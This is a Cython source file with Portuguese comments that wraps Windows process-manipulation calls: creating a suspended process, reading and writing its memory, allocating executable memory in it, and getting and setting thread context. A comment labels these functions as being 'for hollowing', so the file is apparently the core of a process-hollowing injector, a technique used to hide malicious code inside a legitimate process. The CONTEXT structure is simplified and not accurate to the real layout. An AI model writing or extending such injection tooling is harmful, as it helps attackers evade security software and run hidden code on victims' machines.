# core/winapi.pyx
cimport cython
from libc.stdlib cimport malloc, free
from libc.string cimport memcpy, memset

# Definir tipos manualmente já que o Cython não reconhece os tipos do Windows diretamente
ctypedef unsigned int DWORD
ctypedef int BOOL
ctypedef void* HANDLE
ctypedef void* LPVOID
ctypedef unsigned short WORD
ctypedef unsigned char BYTE

# Estruturas simplificadas
cdef struct PROCESS_INFORMATION:
    HANDLE hProcess
    HANDLE hThread
    DWORD dwProcessId
    DWORD dwThreadId

cdef struct STARTUPINFOW:
    DWORD cb
    DWORD dwFlags
    WORD wShowWindow
    # Outros campos omitidos para simplificação

cdef struct CONTEXT:
    DWORD ContextFlags
    DWORD Dr0
    DWORD Dr1
    DWORD Dr2
    DWORD Dr3
    DWORD Dr6
    DWORD Dr7
    DWORD FloatSave
    DWORD SegGs
    DWORD SegFs
    DWORD SegEs
    DWORD SegDs
    DWORD Edi
    DWORD Esi
    DWORD Ebx
    DWORD Edx
    DWORD Ecx
    DWORD Eax
    DWORD Ebp
    DWORD Eip
    DWORD SegCs
    DWORD EFlags
    DWORD Esp
    DWORD SegSs
    BYTE ExtendedRegisters[512]

# Constantes
cdef DWORD CREATE_SUSPENDED = 0x00000004
cdef DWORD MEM_COMMIT = 0x00001000
cdef DWORD MEM_RESERVE = 0x00002000
cdef DWORD PAGE_EXECUTE_READWRITE = 0x40
cdef DWORD PAGE_READWRITE = 0x04
cdef DWORD CONTEXT_FULL = 0x00010007

# Importar funções da API do Windows
cdef extern from "Windows.h":
    BOOL CreateProcessW(
        const wchar_t* lpApplicationName,
        wchar_t* lpCommandLine,
        void* lpProcessAttributes,
        void* lpThreadAttributes,
        BOOL bInheritHandles,
        DWORD dwCreationFlags,
        void* lpEnvironment,
        const wchar_t* lpCurrentDirectory,
        STARTUPINFOW* lpStartupInfo,
        PROCESS_INFORMATION* lpProcessInformation
    )
    
    DWORD ResumeThread(HANDLE hThread)
    BOOL CloseHandle(HANDLE hObject)
    HANDLE GetCurrentProcess()
    DWORD GetLastError()
    BOOL ReadProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPVOID lpBuffer, DWORD nSize, DWORD* lpNumberOfBytesRead)
    BOOL WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPVOID lpBuffer, DWORD nSize, DWORD* lpNumberOfBytesWritten)
    LPVOID VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, DWORD dwSize, DWORD flAllocationType, DWORD flProtect)
    BOOL VirtualFreeEx(HANDLE hProcess, LPVOID lpAddress, DWORD dwSize, DWORD dwFreeType)
    BOOL GetThreadContext(HANDLE hThread, CONTEXT* lpContext)
    BOOL SetThreadContext(HANDLE hThread, CONTEXT* lpContext)

# Estrutura para armazenar informações do processo
cdef struct ProcessInfo:
    HANDLE hProcess
    HANDLE hThread
    DWORD dwProcessId
    DWORD dwThreadId

# Variável global para armazenar informações do processo suspenso
cdef ProcessInfo g_suspended_process
g_suspended_process.hProcess = NULL
g_suspended_process.hThread = NULL
g_suspended_process.dwProcessId = 0
g_suspended_process.dwThreadId = 0

cpdef create_suspended_process(path):
    cdef:
        STARTUPINFOW si
        PROCESS_INFORMATION pi
        wchar_t* application_name = NULL
        BOOL success
        bytes wide_path
    
    # Converter string Python para wide string
    try:
        wide_path = path.encode('utf-16le')
        application_name = <wchar_t*>malloc(len(wide_path) + 2)
        if application_name == NULL:
            print("[Cython] Falha ao alocar memória")
            return False
        
        memcpy(application_name, <wchar_t*>wide_path, len(wide_path))
        application_name[len(wide_path) // 2] = 0  # Null terminator
    except Exception as e:
        print(f"[Cython] Erro ao converter caminho: {e}")
        if application_name != NULL:
            free(application_name)
        return False

    # Inicializar estruturas
    memset(&si, 0, sizeof(STARTUPINFOW))
    si.cb = sizeof(STARTUPINFOW)
    memset(&pi, 0, sizeof(PROCESS_INFORMATION))
    
    # Criar processo suspenso
    success = CreateProcessW(
        application_name,  # Nome do aplicativo
        NULL,              # Linha de comando
        NULL,              # Atributos de processo
        NULL,              # Atributos de thread
        False,             # Herdar handles
        CREATE_SUSPENDED,  # Flags de criação
        NULL,              # Ambiente
        NULL,              # Diretório atual
        &si,               # Informações de inicialização
        &pi                # Informações do processo
    )
    
    free(application_name)
    
    if not success:
        error_code = GetLastError()
        print(f"[Cython] Falha ao criar processo suspenso. Código de erro: {error_code}")
        return False
    
    # Armazenar informações do processo globalmente
    g_suspended_process.hProcess = pi.hProcess
    g_suspended_process.hThread = pi.hThread
    g_suspended_process.dwProcessId = pi.dwProcessId
    g_suspended_process.dwThreadId = pi.dwThreadId
    
    print(f"[Cython] Processo suspenso criado com sucesso → PID: {pi.dwProcessId}")
    return True

cpdef resume_process():
    if g_suspended_process.hThread == NULL:
        print("[Cython] Nenhum processo suspenso para retomar")
        return False
    
    result = ResumeThread(g_suspended_process.hThread)
    
    if result == 0xFFFFFFFF:  # (DWORD)-1
        error_code = GetLastError()
        print(f"[Cython] Falha ao retomar processo. Código de erro: {error_code}")
        return False
    
    # Fechar handles
    CloseHandle(g_suspended_process.hProcess)
    CloseHandle(g_suspended_process.hThread)
    
    # Resetar estrutura
    g_suspended_process.hProcess = NULL
    g_suspended_process.hThread = NULL
    g_suspended_process.dwProcessId = 0
    g_suspended_process.dwThreadId = 0
    
    print("[Cython] Processo retomado com sucesso")
    return True

# Funções adicionais para hollowing
cpdef read_process_memory(address, size):
    cdef:
        HANDLE hProcess = g_suspended_process.hProcess
        void* lpBuffer = malloc(size)
        DWORD bytes_read = 0
        BOOL success
    
    if hProcess == NULL:
        print("[Cython] Nenhum processo aberto")
        free(lpBuffer)
        return None
    
    if lpBuffer == NULL:
        print("[Cython] Falha ao alocar buffer")
        return None
    
    success = ReadProcessMemory(hProcess, <LPVOID>address, lpBuffer, size, &bytes_read)
    
    if not success or bytes_read != size:
        error_code = GetLastError()
        print(f"[Cython] Falha ao ler memória. Código de erro: {error_code}")
        free(lpBuffer)
        return None
    
    # Converter para bytes Python
    try:
        result = (<char*>lpBuffer)[:size]
    finally:
        free(lpBuffer)
    
    return result

cpdef write_process_memory(address, data):
    cdef:
        HANDLE hProcess = g_suspended_process.hProcess
        DWORD bytes_written = 0
        BOOL success
        Py_ssize_t size = len(data)
        char* buffer = data
    
    if hProcess == NULL:
        print("[Cython] Nenhum processo aberto")
        return False
    
    success = WriteProcessMemory(hProcess, <LPVOID>address, buffer, size, &bytes_written)
    
    if not success or bytes_written != size:
        error_code = GetLastError()
        print(f"[Cython] Falha ao escrever memória. Código de erro: {error_code}")
        return False
    
    return True

cpdef virtual_alloc_ex(size, address=0):
    cdef:
        HANDLE hProcess = g_suspended_process.hProcess
        LPVOID alloc_address
    
    if hProcess == NULL:
        print("[Cython] Nenhum processo aberto")
        return 0
    
    alloc_address = VirtualAllocEx(
        hProcess,
        <LPVOID>address,
        size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    )
    
    if alloc_address == NULL:
        error_code = GetLastError()
        print(f"[Cython] Falha ao alocar memória. Código de erro: {error_code}")
        return 0
    
    return <unsigned long long>alloc_address

cpdef get_thread_context():
    cdef:
        HANDLE hThread = g_suspended_process.hThread
        CONTEXT context
        BOOL success
    
    if hThread == NULL:
        print("[Cython] Nenhum thread suspenso")
        return None
    
    context.ContextFlags = CONTEXT_FULL
    success = GetThreadContext(hThread, &context)
    
    if not success:
        error_code = GetLastError()
        print(f"[Cython] Falha ao obter contexto. Código de erro: {error_code}")
        return None
    
    # Retornar dicionário com valores do contexto
    return {
        'Eax': context.Eax,
        'Ebx': context.Ebx,
        'Ecx': context.Ecx,
        'Edx': context.Edx,
        'Esi': context.Esi,
        'Edi': context.Edi,
        'Ebp': context.Ebp,
        'Esp': context.Esp,
        'Eip': context.Eip,
        'SegCs': context.SegCs,
        'SegDs': context.SegDs,
        'SegEs': context.SegEs,
        'SegFs': context.SegFs,
        'SegGs': context.SegGs,
        'SegSs': context.SegSs,
        'EFlags': context.EFlags
    }

cpdef set_thread_context(context_dict):
    cdef:
        HANDLE hThread = g_suspended_process.hThread
        CONTEXT context
        BOOL success
    
    if hThread == NULL:
        print("[Cython] Nenhum thread suspenso")
        return False
    
    # Preencher estrutura CONTEXT com valores do dicionário
    context.ContextFlags = CONTEXT_FULL
    context.Eax = context_dict.get('Eax', 0)
    context.Ebx = context_dict.get('Ebx', 0)
    context.Ecx = context_dict.get('Ecx', 0)
    context.Edx = context_dict.get('Edx', 0)
    context.Esi = context_dict.get('Esi', 0)
    context.Edi = context_dict.get('Edi', 0)
    context.Ebp = context_dict.get('Ebp', 0)
    context.Esp = context_dict.get('Esp', 0)
    context.Eip = context_dict.get('Eip', 0)
    context.SegCs = context_dict.get('SegCs', 0)
    context.SegDs = context_dict.get('SegDs', 0)
    context.SegEs = context_dict.get('SegEs', 0)
    context.SegFs = context_dict.get('SegFs', 0)
    context.SegGs = context_dict.get('SegGs', 0)
    context.SegSs = context_dict.get('SegSs', 0)
    context.EFlags = context_dict.get('EFlags', 0)
    
    success = SetThreadContext(hThread, &context)
    
    if not success:
        error_code = GetLastError()
        print(f"[Cython] Falha ao definir contexto. Código de erro: {error_code}")
        return False
    
    return True

cpdef get_process_handle():
    return <unsigned long long>g_suspended_process.hProcess

cpdef get_thread_handle():
    return <unsigned long long>g_suspended_process.hThread